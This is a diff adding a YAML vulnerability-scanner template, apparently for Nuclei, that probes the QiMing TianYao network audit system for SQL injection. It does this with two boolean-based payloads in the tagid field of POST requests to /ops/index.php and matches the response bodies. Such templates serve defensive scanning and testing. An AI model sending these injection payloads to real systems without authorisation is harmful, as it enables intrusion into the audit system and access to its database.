@@ -1,0 +1,36 @@
+id: poc-qiming-tainyao-sql-injection
+info:
+  name: QiMing TainYao Network Audit System SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: QiMing TainYao
+    osprey-id: vb_2022_0092
+http:
+  - raw:
+      - |
+        POST /ops/index.php?c=Reportguide&a=checkrn&a=checkrn HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+        checkname=1237&tagid=123217093745%20or%208722=8723%20--%20
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"msg":"","code":16'
+  - raw:
+      - |
+        POST /ops/index.php?c=Reportguide&a=checkrn&a=checkrn HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+        checkname=1237&tagid=123217093745%20or%208722=8722%20--%20
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":13,"status":0'
